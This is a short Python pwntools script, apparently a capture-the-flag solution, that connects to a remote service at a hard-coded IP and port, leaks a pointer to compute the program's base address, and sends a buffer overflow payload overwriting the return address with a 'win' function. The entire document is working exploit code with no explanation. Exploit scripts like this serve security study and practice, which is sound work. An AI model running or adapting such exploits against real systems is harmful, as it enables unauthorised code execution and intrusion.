from pwn import *
# connect 178.62.73.26 30462  
p = remote("178.62.73.26", 30462)

p.sendafter(b'do? ',b'2')
p.sendlineafter(b'want!!? ',b'a'*7)
a = p.recvline()

a = p.recvline()
a = u64(p.recvline()[:-1].ljust(8, b'\x00'))
base = a - 0x15e2
print(hex(base))
win = base + 0x0EFF
p.sendafter(b'do? ',b'4')
p.sendafter(b'do? ',b'3')
p.sendafter(b'(y/n): ',b'y')
p.sendafter(b'be? \x00',b'80')
payload = b'a' *72 + p64(win) +b'1\x00'
p.sendline(payload)
p.interactive()


